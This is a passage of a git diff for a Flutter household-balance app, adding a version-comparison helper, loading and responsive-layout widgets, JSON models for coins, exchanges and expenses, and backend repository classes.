appLocalizations.january,\n+      appLocalizations.february,\n+      appLocalizations.march,\n+      appLocalizations.april,\n+      appLocalizations.may,\n+      appLocalizations.june,\n+      appLocalizations.july,\n+      appLocalizations.august,\n+      appLocalizations.september,\n+      appLocalizations.october,\n+      appLocalizations.november,\n+      appLocalizations.december\n+    ];\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/core\/views\/app_info_loading_view.dart b\/frontend\/flutter\/lib\/src\/core\/views\/app_info_loading_view.dart\nindex 3b2b25d..2282374 100644\n--- a\/frontend\/flutter\/lib\/src\/core\/views\/app_info_loading_view.dart\n+++ b\/frontend\/flutter\/lib\/src\/core\/views\/app_info_loading_view.dart\n@@ -87,7 +87,7 @@ class AppInfoLoadingView extends ConsumerWidget {\n     try {\n       final packageInfo = await PackageInfo.fromPlatform();\n       final response = await ref.read(httpServiceProvider).sendGetRequest(APIContract.frontendVersion);\n-      if (response.content[\"version\"] != packageInfo.version) {\n+      if (isLowerVersion(packageInfo.version, response.content[\"version\"])) {\n         errorMessage = appLocalizations.wrongVersion;\n         return false;\n       }\n@@ -99,6 +99,31 @@ class AppInfoLoadingView extends ConsumerWidget {\n     return true;\n   }\n \n+  \/\/\/ Checks if [version1] is lower than [version2]\n+  bool isLowerVersion(String version1, String version2) {\n+    List<int> versionIntList1 = version1.split(\".\").map((e) => int.parse(e)).toList();\n+    List<int> versionIntList2 = version2.split(\".\").map((e) => int.parse(e)).toList();\n+    if (versionIntList1[0] > versionIntList2[0]) {\n+      return false;\n+    } else if (versionIntList1[0] < versionIntList2[0]) {\n+      return true;\n+    } else { \/\/ versionIntList1[0] == versionIntList2[0]\n+      if (versionIntList1[1] > versionIntList2[1]) {\n+        return false;\n+      } else if (versionIntList1[1] < versionIntList2[1]) {\n+        return true;\n+      }else { \/\/ versionIntList1[1] == versionIntList2[1]\n+        if (versionIntList1[2] > versionIntList2[2]) {\n+          return false;\n+        } else if (versionIntList1[2] < versionIntList2[2]) {\n+          return true;\n+        } else {\n+          return false;\n+        }\n+      }\n+    }\n+  }\n+\n   Future<bool> oneSecond() async {\n     await Future.delayed(const Duration(seconds: 1));\n     return true;\ndiff --git a\/frontend\/flutter\/lib\/src\/core\/widgets\/future_widget.dart b\/frontend\/flutter\/lib\/src\/core\/widgets\/future_widget.dart\nnew file mode 100644\nindex 0000000..bab24b8\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/core\/widgets\/future_widget.dart\n@@ -0,0 +1,66 @@\n+import 'package:flutter\/material.dart';\n+\n+class FutureWidget<T> extends StatelessWidget {\n+  final Future<T> future;\n+  final Widget Function(T data) childCreation;\n+  final String? errorMessage;\n+\n+  const FutureWidget({\n+    required this.future,\n+    required this.childCreation,\n+    this.errorMessage,\n+    super.key\n+  });\n+\n+  @override\n+  Widget build(BuildContext context) {\n+    return FutureBuilder<T>(\n+      future: future, \/\/ a previously-obtained Future<String> or null\n+      builder: (BuildContext context, AsyncSnapshot<T> snapshot) {\n+        if (snapshot.hasData) {\n+          return childCreation(snapshot.data as T);\n+        } else if (snapshot.hasError) {\n+          return errorWidget();\n+        } \n+        return loadingWidget();\n+      },\n+    );\n+  }\n+\n+  @visibleForTesting\n+  Widget errorWidget() {\n+    return Center(\n+      child: Column(\n+        mainAxisAlignment: MainAxisAlignment.center,\n+        children: <Widget>[\n+          const Icon(\n+            Icons.error_outline,\n+            color: Colors.red,\n+            size: 60,\n+          ),\n+          if (errorMessage != null)\n+            Padding(\n+              padding: const EdgeInsets.only(top: 16),\n+              child: Text(errorMessage!),\n+            ),\n+        ],\n+      ),\n+    );\n+  }\n+\n+  @visibleForTesting\n+  Widget loadingWidget() {\n+    return Center(\n+      child: Column(\n+        mainAxisAlignment: MainAxisAlignment.center,\n+        children: const <Widget>[\n+          SizedBox(\n+            width: 60,\n+            height: 60,\n+            child: CircularProgressIndicator(),\n+          ),\n+        ],\n+      ),\n+    );\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/core\/widgets\/responsive_layout.dart b\/frontend\/flutter\/lib\/src\/core\/widgets\/responsive_layout.dart\nnew file mode 100644\nindex 0000000..fd67608\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/core\/widgets\/responsive_layout.dart\n@@ -0,0 +1,43 @@\n+import 'package:flutter\/material.dart';\n+\n+class ResponsiveLayout extends StatelessWidget {\n+  final Widget mobileChild;\n+  final Widget tabletChild;\n+  final Widget desktopChild;\n+\n+  \/\/\/ Layout used to display three diferent [Widgets] depending\n+  \/\/\/ on the shortest distance from the device. Distances will be \n+  \/\/\/ related to mobile, tablet and desktop platforms.\n+  const ResponsiveLayout({\n+    super.key, \n+    required this.mobileChild, \n+    required this.tabletChild, \n+    required this.desktopChild\n+  });\n+\n+  \/\/\/ Gets the side of the screen with the shortest distance\n+  \/\/\/ from the device, and compares it with a magic number\n+  \/\/\/ used to classify wide screens for mobile, tablet and desktop\n+  \/\/\/ platforms.\n+  \/\/\/\n+  \/\/\/ For convenience, 600 is usually used for 7 inches tablets,\n+  \/\/\/ but there are exceptions such as the *Nexus 7 2012* whose\n+  \/\/\/ value is 552, therefore it is preferred to use 550 for tablets.\n+  @override\n+  Widget build(BuildContext context) {\n+    return LayoutBuilder(\n+      builder: (BuildContext context, BoxConstraints constraints) {\n+        double width = MediaQueryData.fromWindow(WidgetsBinding.instance.window)\n+          .size\n+          .width;\n+        if (width < 550) {\n+          return mobileChild;\n+        } else if (width < 1024) {\n+          return tabletChild;\n+        } else {\n+          return desktopChild;\n+        }\n+      },\n+    );\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/auth\/data\/models\/account_model.dart b\/frontend\/flutter\/lib\/src\/features\/auth\/data\/models\/account_model.dart\nindex e83505f..8ea1876 100644\n--- a\/frontend\/flutter\/lib\/src\/features\/auth\/data\/models\/account_model.dart\n+++ b\/frontend\/flutter\/lib\/src\/features\/auth\/data\/models\/account_model.dart\n@@ -3,23 +3,18 @@ import 'package:json_annotation\/json_annotation.dart';\n \n part 'account_model.g.dart';\n \n-@JsonSerializable()\n+@JsonSerializable(fieldRename: FieldRename.snake)\n class AccountModel extends Equatable {\n \n   final String username;\n   final String email;\n-  @JsonKey(name: 'receive_email_balance')\n   final bool receiveEmailBalance;\n   final double balance;\n-  @JsonKey(name: 'expected_annual_balance')\n   final double expectedAnnualBalance;\n-  @JsonKey(name: 'expected_monthly_balance')\n   final double expectedMonthlyBalance;\n   final String language;\n-  @JsonKey(name: 'pref_coin_type')\n   final String prefCoinType;\n   final String image;\n-  @JsonKey(name: 'last_login')\n   final DateTime? lastLogin;\n \n   const AccountModel({\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/auth\/presentation\/views\/auth_view.dart b\/frontend\/flutter\/lib\/src\/features\/auth\/presentation\/views\/auth_view.dart\nindex db6428f..c9f5925 100644\n--- a\/frontend\/flutter\/lib\/src\/features\/auth\/presentation\/views\/auth_view.dart\n+++ b\/frontend\/flutter\/lib\/src\/features\/auth\/presentation\/views\/auth_view.dart\n@@ -1,4 +1,5 @@\n import 'package:balance_home_app\/src\/core\/providers\/localization_provider.dart';\n+import 'package:balance_home_app\/src\/core\/services\/request_error_handler_libw.dart';\n import 'package:balance_home_app\/src\/core\/views\/app_titlle.dart';\n import 'package:balance_home_app\/src\/core\/widgets\/language_picker_dropdown.dart';\n import 'package:balance_home_app\/src\/features\/coin\/data\/models\/coin_type_model.dart';\n@@ -7,7 +8,6 @@ import 'package:balance_home_app\/src\/features\/login\/presentation\/views\/login_vie\n import 'package:balance_home_app\/src\/features\/register\/presentation\/views\/register_view.dart';\n import 'package:flutter\/material.dart';\n import 'package:flutter_riverpod\/flutter_riverpod.dart';\n-import 'package:go_router\/go_router.dart';\n import 'package:language_picker\/languages.dart';\n \n class AuthView extends ConsumerWidget {\n@@ -18,6 +18,7 @@ class AuthView extends ConsumerWidget {\n   final registerPasswordController = TextEditingController();\n   final registerPassword2Controller = TextEditingController();\n   final registerInvitationCodeController = TextEditingController();\n+  final RequestErrorHandlerLibW requestErrorHandler = RequestErrorHandlerLibW();\n \n   AuthView({super.key});\n \n@@ -43,7 +44,7 @@ class AuthView extends ConsumerWidget {\n                 if (snapshot.data != null && snapshot.data!.isNotEmpty) {\n                   coinTypes = snapshot.data!;\n                 } else {\n-                  context.go(\"\/server-error\");\n+                  requestErrorHandler.goToErrorPage();\n                 }\n                 return Column(\n                   children: [\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/coin_type_model.dart b\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/coin_type_model.dart\nindex 88898fb..0526648 100644\n--- a\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/coin_type_model.dart\n+++ b\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/coin_type_model.dart\n@@ -3,7 +3,7 @@ import 'package:json_annotation\/json_annotation.dart';\n \n part 'coin_type_model.g.dart';\n \n-@JsonSerializable()\n+@JsonSerializable(fieldRename: FieldRename.snake)\n class CoinTypeModel extends Equatable {\n \n   final String code;\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/date_exchange_model.dart b\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/date_exchange_model.dart\nnew file mode 100644\nindex 0000000..055771c\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/date_exchange_model.dart\n@@ -0,0 +1,26 @@\n+import 'package:balance_home_app\/src\/features\/coin\/data\/models\/exchanges_list_model.dart';\n+import 'package:equatable\/equatable.dart';\n+import 'package:json_annotation\/json_annotation.dart';\n+\n+part 'date_exchange_model.g.dart';\n+\n+@JsonSerializable(fieldRename: FieldRename.snake)\n+class DateExchangeModel extends Equatable {\n+\n+  final List<ExchangesListModel> exchanges;\n+  final DateTime date;\n+\n+  const DateExchangeModel({\n+      required this.exchanges,\n+      required this.date\n+  });\n+\n+  \/\/ Json Serializable\n+  factory DateExchangeModel.fromJson(Map<String, dynamic> json) =>\n+    _$DateExchangeModelFromJson(json);\n+\n+  Map<String, dynamic> toJson() => _$DateExchangeModelToJson(this);\n+\n+  @override\n+  List<Object?> get props => [date, exchanges];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/date_exchanges_list_model.dart b\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/date_exchanges_list_model.dart\nnew file mode 100644\nindex 0000000..7705e4c\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/date_exchanges_list_model.dart\n@@ -0,0 +1,24 @@\n+import 'package:balance_home_app\/src\/features\/coin\/data\/models\/date_exchange_model.dart';\n+import 'package:equatable\/equatable.dart';\n+import 'package:json_annotation\/json_annotation.dart';\n+\n+part 'date_exchanges_list_model.g.dart';\n+\n+@JsonSerializable(fieldRename: FieldRename.snake)\n+class DateExchangesListModel extends Equatable {\n+\n+  final List<DateExchangeModel> dateExchanges;\n+\n+  const DateExchangesListModel({\n+      required this.dateExchanges\n+  });\n+\n+  \/\/ Json Serializable\n+  factory DateExchangesListModel.fromJson(Map<String, dynamic> json) =>\n+    _$DateExchangesListModelFromJson(json);\n+\n+  Map<String, dynamic> toJson() => _$DateExchangesListModelToJson(this);\n+\n+  @override\n+  List<Object?> get props => [dateExchanges];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/exchange_model.dart b\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/exchange_model.dart\nnew file mode 100644\nindex 0000000..2441f32\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/exchange_model.dart\n@@ -0,0 +1,25 @@\n+import 'package:equatable\/equatable.dart';\n+import 'package:json_annotation\/json_annotation.dart';\n+\n+part 'exchange_model.g.dart';\n+\n+@JsonSerializable(fieldRename: FieldRename.snake)\n+class ExchangeModel extends Equatable {\n+\n+  final String code;\n+  final double value;\n+\n+  const ExchangeModel({\n+      required this.code,\n+      required this.value\n+  });\n+\n+  \/\/ Json Serializable\n+  factory ExchangeModel.fromJson(Map<String, dynamic> json) =>\n+    _$ExchangeModelFromJson(json);\n+\n+  Map<String, dynamic> toJson() => _$ExchangeModelToJson(this);\n+\n+  @override\n+  List<Object?> get props => [code, value];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/exchanges_list_model.dart b\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/exchanges_list_model.dart\nnew file mode 100644\nindex 0000000..537846a\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/coin\/data\/models\/exchanges_list_model.dart\n@@ -0,0 +1,26 @@\n+import 'package:balance_home_app\/src\/features\/coin\/data\/models\/exchange_model.dart';\n+import 'package:equatable\/equatable.dart';\n+import 'package:json_annotation\/json_annotation.dart';\n+\n+part 'exchanges_list_model.g.dart';\n+\n+@JsonSerializable(fieldRename: FieldRename.snake)\n+class ExchangesListModel extends Equatable {\n+\n+  final String code;\n+  final List<ExchangeModel> exchanges;\n+\n+  const ExchangesListModel({\n+      required this.code,\n+      required this.exchanges\n+  });\n+\n+  \/\/ Json Serializable\n+  factory ExchangesListModel.fromJson(Map<String, dynamic> json) =>\n+    _$ExchangesListModelFromJson(json);\n+\n+  Map<String, dynamic> toJson() => _$ExchangesListModelToJson(this);\n+\n+  @override\n+  List<Object?> get props => [code, exchanges];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/coin\/data\/repositories\/exchange_repository.dart b\/frontend\/flutter\/lib\/src\/features\/coin\/data\/repositories\/exchange_repository.dart\nnew file mode 100644\nindex 0000000..eba425e\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/coin\/data\/repositories\/exchange_repository.dart\n@@ -0,0 +1,36 @@\n+import 'package:balance_home_app\/src\/core\/services\/api_contract.dart';\n+import 'package:balance_home_app\/src\/core\/services\/http_service.dart';\n+import 'package:balance_home_app\/src\/features\/coin\/data\/models\/date_exchanges_list_model.dart';\n+import 'package:balance_home_app\/src\/features\/coin\/data\/models\/exchanges_list_model.dart';\n+\n+abstract class IExchangeRepository {\n+  Future<ExchangesListModel> getExchanges(String code);\n+\n+  Future<DateExchangesListModel> getLastDateExchanges({required int days});\n+}\n+\n+class ExchangeRepository implements IExchangeRepository {\n+\n+  final HttpService httpService;\n+\n+  ExchangeRepository({required this.httpService});\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch an exchange.\n+  @override\n+  Future<ExchangesListModel> getExchanges(String code) async {\n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.coinExchange}\/$code'\n+    );\n+    return ExchangesListModel.fromJson(response.content);\n+  }\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch as many \n+  \/\/\/ date exchanges as days.\n+  @override\n+  Future<DateExchangesListModel> getLastDateExchanges({required int days}) async {\n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.coinExchange}\/days=$days'\n+    );\n+    return DateExchangesListModel.fromJson(response.content);\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/coin\/logic\/providers\/exchange_provider.dart b\/frontend\/flutter\/lib\/src\/features\/coin\/logic\/providers\/exchange_provider.dart\nnew file mode 100644\nindex 0000000..1e3709b\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/coin\/logic\/providers\/exchange_provider.dart\n@@ -0,0 +1,11 @@\n+\n+import 'package:balance_home_app\/src\/core\/providers\/http_service_provider.dart';\n+import 'package:balance_home_app\/src\/features\/coin\/data\/repositories\/exchange_repository.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+\/\/\/ Repository\n+final exchangeRepositoryProvider = Provider<IExchangeRepository>(\n+  (ProviderRef<IExchangeRepository> ref) => ExchangeRepository(\n+    httpService: ref.read(httpServiceProvider)\n+  )\n+);\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/expense\/data\/models\/expense_model.dart b\/frontend\/flutter\/lib\/src\/features\/expense\/data\/models\/expense_model.dart\nnew file mode 100644\nindex 0000000..52115e6\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/expense\/data\/models\/expense_model.dart\n@@ -0,0 +1,38 @@\n+import 'package:balance_home_app\/src\/features\/expense\/data\/models\/expense_type_model.dart';\n+import 'package:equatable\/equatable.dart';\n+import 'package:json_annotation\/json_annotation.dart';\n+\n+part 'expense_model.g.dart';\n+\n+@JsonSerializable(fieldRename: FieldRename.snake)\n+class ExpenseModel extends Equatable {\n+\n+  final int id;\n+  final String name;\n+  final String description;\n+  final double quantity;\n+  final DateTime date;\n+  final String coinType;\n+  final ExpenseTypeModel expType;\n+\n+  const ExpenseModel({\n+    required this.id,\n+    required this.name,\n+    required this.description,\n+    required this.quantity,\n+    required this.date,\n+    required this.coinType,\n+    required this.expType,\n+  });\n+\n+  \/\/ Json Serializable\n+  factory ExpenseModel.fromJson(Map<String, dynamic> json) =>\n+    _$ExpenseModelFromJson(json);\n+\n+  Map<String, dynamic> toJson() => _$ExpenseModelToJson(this);\n+\n+  @override\n+  List<Object?> get props => [\n+    id\n+  ];\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/expense\/data\/models\/expense_type_model.dart b\/frontend\/flutter\/lib\/src\/features\/expense\/data\/models\/expense_type_model.dart\nnew file mode 100644\nindex 0000000..7eff1f0\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/expense\/data\/models\/expense_type_model.dart\n@@ -0,0 +1,27 @@\n+import 'package:equatable\/equatable.dart';\n+import 'package:json_annotation\/json_annotation.dart';\n+\n+part 'expense_type_model.g.dart';\n+\n+@JsonSerializable(fieldRename: FieldRename.snake)\n+class ExpenseTypeModel extends Equatable {\n+\n+  final String name;\n+  final String image;\n+  \n+  const ExpenseTypeModel({\n+    required this.name,\n+    required this.image,\n+  });\n+\n+  \/\/ Json Serializable\n+  factory ExpenseTypeModel.fromJson(Map<String, dynamic> json) =>\n+    _$ExpenseTypeModelFromJson(json);\n+\n+  Map<String, dynamic> toJson() => _$ExpenseTypeModelToJson(this);\n+\n+  @override\n+  List<Object?> get props => [\n+    name\n+  ];\n+}\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/expense\/data\/repositories\/expense_repository.dart b\/frontend\/flutter\/lib\/src\/features\/expense\/data\/repositories\/expense_repository.dart\nnew file mode 100644\nindex 0000000..58bfb53\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/expense\/data\/repositories\/expense_repository.dart\n@@ -0,0 +1,93 @@\n+import 'package:balance_home_app\/src\/core\/data\/models\/balance_years_model.dart';\n+import 'package:balance_home_app\/src\/core\/data\/models\/pagination_model.dart';\n+import 'package:balance_home_app\/src\/core\/services\/api_contract.dart';\n+import 'package:balance_home_app\/src\/core\/services\/http_service.dart';\n+import 'package:balance_home_app\/src\/features\/expense\/data\/models\/expense_model.dart';\n+\n+abstract class IExpenseRepository {\n+  Future<ExpenseModel> getExpense(int id);\n+\n+  Future<List<ExpenseModel>> getExpenses({\n+    DateTime? dateFrom,\n+    DateTime? dateTo\n+  });\n+  \n+  Future<List<int>> getExpenseYears();\n+  \n+  Future<void> createExpense(ExpenseModel expense);\n+  \n+  Future<void> updateExpense(ExpenseModel expense);\n+}\n+\n+class ExpenseRepository implements IExpenseRepository {\n+\n+  final HttpService httpService;\n+\n+  ExpenseRepository({required this.httpService});\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch an expense.\n+  @override\n+  Future<ExpenseModel> getExpense(int id) async {\n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.expense}\/${id.toString()}'\n+    );\n+    return ExpenseModel.fromJson(response.content);\n+  }\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch all expenses.\n+  @override\n+  Future<List<ExpenseModel>> getExpenses({\n+    DateTime? dateFrom,\n+    DateTime? dateTo\n+  }) async {\n+    String extraArgs = \"\";\n+    if (dateFrom != null) {\n+      extraArgs += \"&date_from=${dateFrom.year}-${dateFrom.month}-${dateFrom.day}\";\n+    }\n+    if (dateTo != null) {\n+      extraArgs += \"&date_to=${dateTo.year}-${dateTo.month}-${dateTo.day}\";\n+    }\n+    int pageNumber = 1;\n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.expense}?page=$pageNumber$extraArgs'\n+    );\n+    PaginationModel page = PaginationModel.fromJson(response.content);\n+    List<ExpenseModel> expenses = page.results.map((e) => ExpenseModel.fromJson(e)).toList();\n+    while (page.next != null) {\n+      HttpResponse response = await httpService.sendGetRequest(\n+        '${APIContract.expense}?page=$pageNumber$extraArgs'\n+      );\n+      page = PaginationModel.fromJson(response.content);\n+      expenses += page.results.map((e) => ExpenseModel.fromJson(e)).toList();\n+      pageNumber ++;\n+    }\n+    return expenses;\n+  }\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch all years with expenses.\n+  @override\n+  Future<List<int>> getExpenseYears() async {\n+    HttpResponse response = await httpService.sendGetRequest(\n+      APIContract.expenseYears\n+    );\n+    return BalanceYearsModel.fromJson(response.content).years;\n+  }\n+\n+  \/\/\/ Sends a [POST] request to backend service to create an expense.\n+  @override\n+  Future<void> createExpense(ExpenseModel expense) async {\n+    await httpService.sendPostRequest(\n+      '${APIContract.expense}\/${expense.id.toString()}',\n+      expense.toJson()\n+    );\n+  }\n+\n+  \/\/\/ Sends a [PUT] request to backend service to update an expense.\n+  @override\n+  Future<void> updateExpense(ExpenseModel expense) async {\n+    await httpService.sendPutRequest(\n+      '${APIContract.expense}\/${expense.id.toString()}',\n+      expense.toJson()\n+    );\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/expense\/data\/repositories\/expense_type_respository.dart b\/frontend\/flutter\/lib\/src\/features\/expense\/data\/repositories\/expense_type_respository.dart\nnew file mode 100644\nindex 0000000..695ec0e\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/expense\/data\/repositories\/expense_type_respository.dart\n@@ -0,0 +1,46 @@\n+import 'package:balance_home_app\/src\/core\/data\/models\/pagination_model.dart';\n+import 'package:balance_home_app\/src\/core\/services\/api_contract.dart';\n+import 'package:balance_home_app\/src\/core\/services\/http_service.dart';\n+import 'package:balance_home_app\/src\/features\/expense\/data\/models\/expense_type_model.dart';\n+\n+abstract class IExpenseTypeRepository {\n+  Future<ExpenseTypeModel> getExpenseType(String code);\n+\n+  Future<List<ExpenseTypeModel>> getExpenseTypes();\n+}\n+\n+class ExpenseTypeRepository implements IExpenseTypeRepository {\n+\n+  final HttpService httpService;\n+\n+  ExpenseTypeRepository({required this.httpService});\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch an expense type.\n+  @override\n+  Future<ExpenseTypeModel> getExpenseType(String name) async {\n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.expenseType}\/$name'\n+    );\n+    return ExpenseTypeModel.fromJson(response.content);\n+  }\n+\n+  \/\/\/ Sends a [GET] request to backend service to fetch all expense types.\n+  @override\n+  Future<List<ExpenseTypeModel>> getExpenseTypes() async {\n+    int pageNumber = 1; \n+    HttpResponse response = await httpService.sendGetRequest(\n+      '${APIContract.expenseType}?page=$pageNumber'\n+    );\n+    PaginationModel page = PaginationModel.fromJson(response.content);\n+    List<ExpenseTypeModel> expenseTypes = page.results.map((e) => ExpenseTypeModel.fromJson(e)).toList();\n+    while (page.next != null) {\n+      HttpResponse response = await httpService.sendGetRequest(\n+        '${APIContract.expenseType}?page=$pageNumber'\n+      );\n+      page = PaginationModel.fromJson(response.content);\n+      expenseTypes += page.results.map((e) => ExpenseTypeModel.fromJson(e)).toList();\n+      pageNumber ++;\n+    }\n+    return expenseTypes;\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/expense\/logic\/providers\/expense_provider.dart b\/frontend\/flutter\/lib\/src\/features\/expense\/logic\/providers\/expense_provider.dart\nnew file mode 100644\nindex 0000000..9d3803a\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/expense\/logic\/providers\/expense_provider.dart\n@@ -0,0 +1,19 @@\n+\n+import 'package:balance_home_app\/src\/core\/providers\/http_service_provider.dart';\n+import 'package:balance_home_app\/src\/features\/expense\/data\/repositories\/expense_repository.dart';\n+import 'package:balance_home_app\/src\/features\/expense\/data\/repositories\/expense_type_respository.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+\/\/\/ Expense type repository\n+final expenseTypeRepositoryProvider = Provider<IExpenseTypeRepository>(\n+  (ProviderRef<IExpenseTypeRepository> ref) => ExpenseTypeRepository(\n+    httpService: ref.read(httpServiceProvider)\n+  )\n+);\n+\n+\/\/\/ Expense repository\n+final expenseRepositoryProvider = Provider<IExpenseRepository>(\n+  (ProviderRef<IExpenseRepository> ref) => ExpenseRepository(\n+    httpService: ref.read(httpServiceProvider)\n+  )\n+);\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/home\/presentation\/views\/home_view.dart b\/frontend\/flutter\/lib\/src\/features\/home\/presentation\/views\/home_view.dart\nindex 651fbfa..221898a 100644\n--- a\/frontend\/flutter\/lib\/src\/features\/home\/presentation\/views\/home_view.dart\n+++ b\/frontend\/flutter\/lib\/src\/features\/home\/presentation\/views\/home_view.dart\n@@ -61,7 +61,7 @@ class HomeView extends ConsumerWidget {\n   }\n \n   NavigationType navigationTypeResolver(BuildContext context) {\n-    if (platformService.isLargeScreen(context) || platformService.isMediumScreen(context)) {\n+    if (platformService.isLargeWindow(context) || platformService.isMediumWindow(context)) {\n       return NavigationType.rail;\n     } else {\n       return NavigationType.bottom;\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/home\/presentation\/widgets\/app_bar.dart b\/frontend\/flutter\/lib\/src\/features\/home\/presentation\/widgets\/app_bar.dart\nindex b24b903..91d56d3 100644\n--- a\/frontend\/flutter\/lib\/src\/features\/home\/presentation\/widgets\/app_bar.dart\n+++ b\/frontend\/flutter\/lib\/src\/features\/home\/presentation\/widgets\/app_bar.dart\n@@ -31,7 +31,10 @@ class CustomAppBar extends ConsumerWidget {\n       elevation: 0,\n       centerTitle: true,\n       backgroundColor: const Color.fromARGB(255, 43, 43, 43),\n-      title: (platformService.isLargeScreen(context) || platformService.isMediumScreen(context)) ? \n+      \/\/ If platform window is considered as large or medium, then the [AppTittle]\n+      \/\/ should be shown, otherwise if mobile is the current platform nothing will be shown, \n+      \/\/ else cases a balance counter should be rendered\n+      title: (platformService.isLargeWindow(context) || platformService.isMediumWindow(context)) ? \n         const AppTittle(fontSize: 30) : \n         (platformService.isMobile) ? _balanceBox(appLocalizations, account!) : null,\n       leading: (platformService.isMobile) ? null : _balanceBox(appLocalizations, account!),\n@@ -42,6 +45,8 @@ class CustomAppBar extends ConsumerWidget {\n     );\n   }\n \n+  \/\/\/ Returns a [Widget] that includes an account balance counter and\n+  \/\/\/ the coint type setup in the account. \n   Widget _balanceBox(AppLocalizations appLocalizations, AccountModel account) {\n     return Container(\n       width: 400,\n@@ -56,6 +61,8 @@ class CustomAppBar extends ConsumerWidget {\n     );\n   }\n \n+  \/\/\/ Returns a [Widget] that includes a button with the image \n+  \/\/\/ profile and name of the user account.\n   Widget _profileButton(AccountModel account) {\n     return ElevatedButton(\n       style: ButtonStyle(\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/credentials_model.dart b\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/credentials_model.dart\nindex f9b080a..cefb21b 100644\n--- a\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/credentials_model.dart\n+++ b\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/credentials_model.dart\n@@ -3,7 +3,7 @@ import 'package:json_annotation\/json_annotation.dart';\n \n part 'credentials_model.g.dart';\n \n-@JsonSerializable()\n+@JsonSerializable(fieldRename: FieldRename.snake)\n class CredentialsModel extends Equatable {\n   \n   final String email;\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/email_code_model.dart b\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/email_code_model.dart\nindex 398197f..febf3a6 100644\n--- a\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/email_code_model.dart\n+++ b\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/email_code_model.dart\n@@ -3,7 +3,7 @@ import 'package:json_annotation\/json_annotation.dart';\n \n part 'email_code_model.g.dart';\n \n-@JsonSerializable()\n+@JsonSerializable(fieldRename: FieldRename.snake)\n class EmailCodeModel extends Equatable {\n   \n   final String email;\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/forgot_password_model.dart b\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/forgot_password_model.dart\nindex 12e3e8c..26c2761 100644\n--- a\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/forgot_password_model.dart\n+++ b\/frontend\/flutter\/lib\/src\/features\/login\/data\/models\/forgot_password_model.dart\n@@ -3,12 +3,11 @@ import 'package:json_annotation\/json_annotation.dart';\n \n part 'forgot_password_model.g.dart';\n \n-@JsonSerializable()\n+@JsonSerializable(fieldRename: FieldRename.snake)\n class ForgotPasswordModel extends Equatable {\n   \n   final String email;\n   final String code;\n-  @JsonKey(name: 'new_password')\n   final String newPassword;\n \n   const ForgotPasswordModel({\ndiff --git 